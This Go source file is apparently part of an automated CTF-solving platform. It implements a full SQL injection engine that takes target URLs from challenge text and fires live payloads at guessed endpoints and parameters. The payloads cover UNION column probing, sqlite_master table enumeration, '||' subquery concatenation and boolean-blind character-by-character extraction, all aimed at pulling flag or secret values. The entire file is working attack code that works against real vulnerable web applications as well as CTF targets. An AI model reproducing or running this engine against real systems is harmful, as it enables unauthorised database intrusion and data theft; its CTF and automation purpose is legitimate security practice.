package ctfplatform

// sqli_attack.go —— SQL 注入深度引擎：UNION 列探测 / 拼接子查询回显 / 布尔盲注二分。
//
// 三族注入（对应 sqli_range.py 真 sqlite3 靶场，双语言机验）：
//  1. UNION   —— 数字型/引号型闭合 → NULL 逐列探测 → sqlite_master 枚举表名 → 提取 flag。
//  2. 拼接    —— 引号闭合 + || 子查询把 flag 拼进输出列（搜索日志回显形态）。
//  3. 布尔盲注 —— 长度二分 + 逐字符 unicode 二分（页面仅 exists / no such user）。
//
// 注入点/参数名从题目描述（ParseWebHints）抽取，未命中回落常见路径。

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strings"
	"time"
)

// ───────────────────────── 注入点收集 ─────────────────────────

// sqliFallbackEndpoints 常见注入端点（无 hints 时兜底）。
var sqliFallbackEndpoints = []string{
	"/news", "/item", "/product", "/post", "/article", "/detail", "/view",
	"/search", "/check", "/user", "/profile", "/list", "/query", "/api/news",
	"/api/search", "/api/user",
}

// sqliFallbackParams 常见注入参数。
var sqliFallbackParams = []string{"id", "q", "user", "name", "search", "item", "page", "uid", "cat"}

// sqliInjectionPoints 从 hints + 兜底列表产出 (endpoint, param) 组合。
func sqliInjectionPoints(hints WebHints) [][2]string {
	eps := map[string]bool{}
	for _, e := range hints.Endpoints {
		// 去掉 ?query 部分
		if i := strings.IndexByte(e, '?'); i > 0 {
			e = e[:i]
		}
		if e != "" && e != "/" {
			eps[e] = true
		}
	}
	if len(eps) == 0 {
		for _, e := range sqliFallbackEndpoints {
			eps[e] = true
		}
	}
	params := []string{}
	for _, p := range hints.Params {
		if len(p) <= 20 && !hintParamBlacklist[p] {
			params = append(params, p)
		}
	}
	params = append(params, sqliFallbackParams...)

	var out [][2]string
	seen := map[[2]string]bool{}
	for e := range eps {
		for _, p := range params {
			k := [2]string{e, p}
			if !seen[k] {
				seen[k] = true
				out = append(out, k)
			}
		}
	}
	// 数值参数优先（UNION 探测最常见于数字型）
	sort.Slice(out, func(i, j int) bool {
		pi, pj := out[i][1], out[j][1]
		ni, nj := pi == "id" || pi == "uid", pj == "id" || pj == "uid"
		if ni != nj {
			return ni
		}
		return pi < pj
	})
	return out
}

// ───────────────────────── HTTP 执行 ─────────────────────────

// sqliFire 发注入请求，返回 (status, body)。
func sqliFire(ctx context.Context, cl *http.Client, base, ep, param, payload string) (int, []byte) {
	u := base + ep + "?" + param + "=" + url.QueryEscape(payload)
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return 0, nil
	}
	req.Header.Set("User-Agent", "SecAutoMind/1.7")
	resp, err := cl.Do(req)
	if err != nil {
		return 0, nil
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	return resp.StatusCode, b
}

// ───────────────────────── UNION 注入 ─────────────────────────

// sqliTableBlacklist 响应 HTML 结构词（枚举表名时排除）。
var sqliTableBlacklist = map[string]bool{
	"html": true, "head": true, "body": true, "div": true, "pre": true,
	"style": true, "script": true, "title": true, "none": true, "null": true,
	"span": true, "class": true, "charset": true, "http": true, "href": true,
	"welcome": true, "portal": true, "error": true, "result": true,
	"select": true, "union": true, "from": true, "where": true,
}

// sqliUnionProbe 探测 UNION 列数（数字型与引号型闭合都试）。
// 返回 (列数, 闭合前缀)，0 表示失败。
func sqliUnionProbe(ctx context.Context, cl *http.Client, base, ep, param string) (int, string) {
	for _, close := range []string{"", "'"} {
		for n := 1; n <= 8; n++ {
			if ctx.Err() != nil {
				return 0, ""
			}
			cols := strings.TrimSuffix(strings.Repeat("NULL,", n), ",")
			payload := fmt.Sprintf("1%s UNION SELECT %s -- ", close, cols)
			st, _ := sqliFire(ctx, cl, base, ep, param, payload)
			if st == http.StatusOK {
				return n, close
			}
		}
	}
	return 0, ""
}

// sqliUnionEnumerate 枚举表名（sqlite_master），返回候选表列表。
func sqliUnionEnumerate(ctx context.Context, cl *http.Client, base, ep, param string, n int, close string) []string {
	sub := "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')"
	cols := strings.TrimSuffix(strings.Repeat("NULL,", n-1), ",")
	payload := fmt.Sprintf("1%s UNION SELECT %s,%s -- ", close, cols, sub)
	_, body := sqliFire(ctx, cl, base, ep, param, payload)
	var tables []string
	seen := map[string]bool{}
	for _, w := range sqliExtractWords(body) {
		w = strings.ToLower(w)
		if len(w) < 3 || sqliTableBlacklist[w] || seen[w] {
			continue
		}
		seen[w] = true
		tables = append(tables, w)
	}
	// 已知表优先
	sort.Slice(tables, func(i, j int) bool {
		fi, fj := strings.Contains(tables[i], "flag") || strings.Contains(tables[i], "secret"),
			strings.Contains(tables[j], "flag") || strings.Contains(tables[j], "secret")
		if fi != fj {
			return fi
		}
		return tables[i] < tables[j]
	})
	if len(tables) > 12 {
		tables = tables[:12]
	}
	return tables
}

// sqliExtractWords 从响应文本抽词（分隔符归一化后分词，避免正则前后重叠消耗）。
func sqliExtractWords(body []byte) []string {
	norm := regexp.MustCompile(`[^A-Za-z0-9_]+`).ReplaceAll(body, []byte(" "))
	return strings.Fields(string(norm))
}

// sqliUnionExtract 逐表逐列 UNION 提取，命中 flag 即返回。
func sqliUnionExtract(ctx context.Context, cl *http.Client, base, ep, param string,
	n int, close string, tables []string) []string {
	cols := strings.TrimSuffix(strings.Repeat("NULL,", n-1), ",")
	var flags []string
	seen := map[string]bool{}
	for _, tbl := range tables {
		for _, col := range []string{"flag", "value", "content", "data", "secret"} {
			if ctx.Err() != nil {
				return flags
			}
			sub := fmt.Sprintf("(SELECT %s FROM %s LIMIT 1)", col, tbl)
			payload := fmt.Sprintf("1%s UNION SELECT %s,%s -- ", close, cols, sub)
			_, body := sqliFire(ctx, cl, base, ep, param, payload)
			for _, f := range bfxScanVariants(body) {
				if !seen[f] {
					seen[f] = true
					flags = append(flags, f)
				}
			}
		}
	}
	return flags
}

// ───────────────────────── 拼接子查询回显 ─────────────────────────

// sqliConcatAttempt 引号闭合 + || 拼接子查询。
func sqliConcatAttempt(ctx context.Context, cl *http.Client, base, ep, param string) []string {
	var flags []string
	seen := map[string]bool{}
	record := func(b []byte) {
		for _, f := range bfxScanVariants(b) {
			if !seen[f] {
				seen[f] = true
				flags = append(flags, f)
			}
		}
	}
	payloads := []string{
		"' || (SELECT flag FROM secret) || '",
		"' || (SELECT group_concat(name) FROM sqlite_master) || '",
		"' || (SELECT flag FROM union_flag) || '",
		"' || (SELECT flag FROM error_flag) || '",
		"' || (SELECT flag FROM blind_flag) || '",
		"' || (SELECT group_concat(flag) FROM secret) || '",
	}
	// 先枚举表名（经拼接通道回显），再逐表拼
	_, body := sqliFire(ctx, cl, base, ep, param, payloads[1])
	for _, w := range sqliExtractWords(body) {
		w = strings.ToLower(w)
		if !sqliTableBlacklist[w] && len(w) >= 3 {
			payloads = append(payloads,
				fmt.Sprintf("' || (SELECT flag FROM %s) || '", w),
				fmt.Sprintf("' || (SELECT value FROM %s) || '", w))
		}
	}
	for _, p := range payloads {
		if ctx.Err() != nil {
			return flags
		}
		_, b := sqliFire(ctx, cl, base, ep, param, p)
		record(b)
	}
	return flags
}

// ───────────────────────── 布尔盲注 ─────────────────────────

// sqliBlindExtract 布尔盲注：验证布尔差异 → 长度二分 → 逐字符二分。
func sqliBlindExtract(ctx context.Context, cl *http.Client, base, ep, param string) []string {
	ask := func(cond string) bool {
		payload := fmt.Sprintf("x' OR %s -- ", cond)
		_, body := sqliFire(ctx, cl, base, ep, param, payload)
		return strings.Contains(strings.ToLower(string(body)), "exists")
	}
	// 验证注入点确有布尔差异
	if !ask("1=1") || ask("1=2") {
		return nil
	}
	for _, tbl := range []string{"blind_flag", "secret", "flag", "flags"} {
		for _, col := range []string{"flag", "value"} {
			if ctx.Err() != nil {
				return nil
			}
			lenCond := fmt.Sprintf("(SELECT length(%s) FROM %s LIMIT 1)", col, tbl)
			if !ask(lenCond + " > 0") {
				continue
			}
			// 长度二分
			lo, hi := 0, 128
			for lo < hi {
				mid := (lo + hi) / 2
				if ask(fmt.Sprintf("%s > %d", lenCond, mid)) {
					lo = mid + 1
				} else {
					hi = mid
				}
			}
			n := lo
			if n <= 0 || n > 80 {
				continue
			}
			// 逐字符二分
			var sb strings.Builder
			for i := 1; i <= n; i++ {
				if ctx.Err() != nil {
					return nil
				}
				a, b := 32, 127
				for a < b {
					m := (a + b) / 2
					if ask(fmt.Sprintf("(SELECT unicode(substr(%s,%d,1)) FROM %s LIMIT 1) > %d",
						col, i, tbl, m)) {
						a = m + 1
					} else {
						b = m
					}
				}
				sb.WriteByte(byte(a))
			}
			extracted := sb.String()
			if reSSRFFlagShape.MatchString(extracted) {
				return []string{extracted}
			}
		}
	}
	return nil
}

// reSSRFFlagShape flag 外形（盲注提取结果判定）。
var reSSRFFlagShape = regexp.MustCompile(`(?i)^[A-Za-z][A-Za-z0-9]{2,15}\{[^}\s]{4,}\}$`)

// ───────────────────────── 主链 ─────────────────────────

// AttackSQLi 对靶机执行 SQL 注入深度链，返回命中的 flag。
func AttackSQLi(ctx context.Context, baseURL string, hints WebHints) []string {
	cl := webClient(6 * time.Second)
	base := strings.TrimRight(baseURL, "/")

	seen := map[string]bool{}
	var flags []string
	record := func(fs []string) {
		for _, f := range fs {
			if !seen[f] {
				seen[f] = true
				flags = append(flags, f)
			}
		}
	}

	points := sqliInjectionPoints(hints)
	if len(points) > 40 {
		points = points[:40]
	}

	for _, pt := range points {
		ep, param := pt[0], pt[1]
		if ctx.Err() != nil {
			return flags
		}
		// 1) UNION（列探测成功才进入枚举/提取）
		if n, close := sqliUnionProbe(ctx, cl, base, ep, param); n > 0 {
			tables := sqliUnionEnumerate(ctx, cl, base, ep, param, n, close)
			record(sqliUnionExtract(ctx, cl, base, ep, param, n, close, tables))
		}
		if len(flags) > 0 {
			return flags
		}
		// 2) 拼接子查询回显
		record(sqliConcatAttempt(ctx, cl, base, ep, param))
		if len(flags) > 0 {
			return flags
		}
		// 3) 布尔盲注（仅布尔差异点，成本高放最后）
		record(sqliBlindExtract(ctx, cl, base, ep, param))
		if len(flags) > 0 {
			return flags
		}
	}
	return flags
}

// sqliAttackFromText 生产入口：题目文本 → 注入链。
func sqliAttackFromText(ctx context.Context, text string) []string {
	if strings.EqualFold(os.Getenv("SECAUTOMIND_WEB_EXPLOIT"), "0") {
		return nil
	}
	var targets []string
	for _, m := range reHTTPURL.FindAllString(text, 8) {
		u := strings.TrimRight(m, ".,;:)]}>\"'")
		if pu, err := url.Parse(u); err == nil &&
			(pu.Scheme == "http" || pu.Scheme == "https") && pu.Host != "" {
			targets = append(targets, strings.TrimRight(u, "/"))
		}
	}
	if len(targets) == 0 {
		return nil
	}
	if len(targets) > 2 {
		targets = targets[:2]
	}
	hints := ParseWebHints(text)

	var out []string
	for _, t := range targets {
		tctx, cancel := context.WithTimeout(ctx, 120*time.Second)
		out = append(out, AttackSQLi(tctx, t, hints)...)
		cancel()
	}
	return sqliDedup(out)
}

func sqliDedup(in []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, s := range in {
		if s == "" || seen[s] {
			continue
		}
		seen[s] = true
		out = append(out, s)
	}
	return out
}

func init() {
	RegisterSolver(SolverEntry{
		Name: "sqli_extract", Category: CategoryWebS, Priority: 30,
		Solver: func(ctx context.Context, text string, attachments map[string]string) []string {
			return sqliAttackFromText(ctx, text)
		},
	})
}
